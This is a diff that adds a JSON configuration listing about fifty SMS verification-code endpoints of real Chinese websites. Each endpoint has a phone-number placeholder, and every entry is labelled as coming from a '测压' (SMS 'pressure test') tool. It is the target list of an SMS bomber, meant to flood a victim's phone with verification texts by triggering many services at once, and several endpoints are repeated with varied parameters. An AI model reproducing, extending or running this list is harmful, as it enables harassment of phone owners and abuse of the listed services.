@@ -1,0 +1,363 @@
+[
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://user.daojia.com/mobile/getcode?mobile=[phone]&bu=101&newVersion=1",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=[phone]&appId=www_home&v=1&sig=&t=1682229781426&v=1",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://knight.ele.me/knight/register/send-captcha?mobile=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://user.daojia.com/user/getSmscode?mobile=[phone]&bu=",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=[phone]&appId=www_home&v=1&sig=&v=1",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://v4-passport.56.com/i/smcode/mobile/signup?mobile=[phone]&way=0&captcha=ehxh&pagetoken=1678013280984&appid=114105&callback=passport4011_cb1678013280987&_=1678013307678",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://www.foundertype.com/index.php/Register/sendSms.html?phone=[phone]&code=2f604e8a0535e3752d692ed3515c605d",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://tuxun.fun/api/v0/phone/getCodeV1?phone=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://web.data.service.ledu.com/pass/ajax_mobile/send_verifycode?callback=jQuery1113034079556154795054_1682217375552&mobile=[phone]&type=reg_mobile&img_code=usb6&_=1682217375564",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=[phone]&imgcode=z2ne&token=ed474d3c2ea836821bae9d7e90f666f6&captchaVersion=2&sendtype=quicklogin&hpquid=q22-0Z81h-56&user_domain=hj&sub_user_domain=&business_domain=yyy_class&callback=cb73ccfa",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://jdapi.jd100.com/uc/v1/getSMSCode?account=[phone]&sign_type=1&use_type=0",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://app.zhuanzhuan.com/zz/transfer/getCaptcha?type=1&mobile=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://xiangedu.com/activity/sendsms?tel=[phone]&tmp=0",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=[phone]&appId=www_home&v=2&sig=&t=1592615855903&v=2",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=0",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=1",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=2",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=3",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=4",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=5",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=6",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=7",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=8",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=9",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=10",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=11",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=12",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=13",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=14",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=15",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=16",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=17",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=18",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=19",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=20",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=21",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=22",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=23",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=24",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=[phone]&type=25",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://vue.misboot.com/system/smsCode.api",
+        "method": "POST",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://www.cappdr.org/login?p_p_id=59_WAR_forgecartportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendsmsverification&p_p_cacheability=cacheLevelPage&p_p_col_id=column-1&p_p_col_count=1&_59_WAR_forgecartportlet_mvcPath=%2Fjsp%2Flogin%2Fview.jsp&_59_WAR_forgecartportlet_namespace=_59_WAR_forgecartportlet_&_59_WAR_forgecartportlet_redirectURL=%2Fpt%2F-%2F---200&_59_WAR_forgecartportlet_tabNameId=create-account",
+        "method": "POST",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "http://www.kltworld.com/home/Register/sendCode",
+        "method": "POST",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=https%3A%2F%2Flogin.ztgame.com%2F&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone=[phone]&mpcode=&pwd=&tname=&idcard=",
+        "method": "GET",
+        "header": {
+            "Referer": "https://reg.ztgame.com/"
+        },
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile=[phone]&country_code=86",
+        "method": "GET",
+        "header": {
+            "Referer": "https://gwbk.zhongan.com/"
+        },
+        "data": ""
+    },
+    {
+        "desc": "来自棒糖测压",
+        "url": "https://51connectors.com/Login/GetLoginVerification?mobile=19100000000",
+        "method": "POST",
+        "header": "",
+        "data": ""
+    }
+]
